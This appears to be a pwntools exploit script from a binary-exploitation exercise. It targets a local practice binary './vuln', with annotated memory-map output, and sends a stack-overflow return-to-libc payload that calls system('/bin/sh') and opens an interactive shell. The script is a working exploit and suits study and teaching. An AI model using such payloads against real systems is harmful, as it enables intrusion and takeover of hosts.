#!/usr/bin/env python2.7
# coding: UTF-8

'''
$ checksec.sh --file ./vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    Not an ELF file   No RPATH   No RUNPATH   ./vuln

$ ldd ./vuln
    linux-gate.so.1 =>  (0xf7791000)
    libc.so.6 => /lib32/libc.so.6 (0xf75cc000)
    /lib/ld-linux.so.2 (0x56642000)

$ ./vuln &pmap $!
[5] 18576
18576:   ./vuln
0000000008048000      4K r-x-- vuln
0000000008049000      4K r---- vuln
000000000804a000      4K rw--- vuln
00000000f7e14000      4K rw---   [ anon ]
00000000f7e15000   1684K r-x-- libc-2.19.so
00000000f7fba000      8K r---- libc-2.19.so
00000000f7fbc000      4K rw--- libc-2.19.so
00000000f7fbd000     16K rw---   [ anon ]
00000000f7fd5000     12K rw---   [ anon ]
00000000f7fd8000      8K r----   [ anon ]
00000000f7fda000      8K r-x--   [ anon ]
00000000f7fdc000    128K r-x-- ld-2.19.so
00000000f7ffc000      4K r---- ld-2.19.so
00000000f7ffd000      4K rw--- ld-2.19.so
00000000fffdd000    132K rw---   [ stack ]
 total             2024K

$ i proc map
process 16384
Mapped address spaces:

    Start Addr   End Addr       Size     Offset objfile
    0xf7e14000 0xf7e15000     0x1000        0x0 
    0xf7e15000 0xf7fba000   0x1a5000        0x0 /lib32/libc-2.19.so
    0xf7fba000 0xf7fbc000     0x2000   0x1a5000 /lib32/libc-2.19.so
    0xf7fbc000 0xf7fbd000     0x1000   0x1a7000 /lib32/libc-2.19.so
    0xf7fbd000 0xf7fc1000     0x4000        0x0 
    0xf7fd7000 0xf7fd8000     0x1000        0x0 
    0xf7fd8000 0xf7fda000     0x2000        0x0 [vvar]
    0xf7fda000 0xf7fdc000     0x2000        0x0 [vdso]
    0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.19.so
    0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.19.so
    0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.19.so
    0xfffdd000 0xffffe000    0x21000        0x0 [stack]

$ x/s 0xf7e15000
0xf7e15000: "\177ELF\001\001\001"
'''

from pwn import *

r = process('./vuln')

libc = ELF('/lib32/libc-2.19.so')

libc_base = 0xf7e15000
libc_puts = libc_base + libc.symbols['puts']
libc_system = libc_base + libc.symbols['system']
addr_binsh  = libc_base + next(libc.search('/bin/sh\0'))

payload = 'a'*112
payload += p32(libc_puts)
payload += p32(libc_system)
payload += p32(libc_base)
payload += p32(addr_binsh)

r.sendline(payload)
r.interactive()
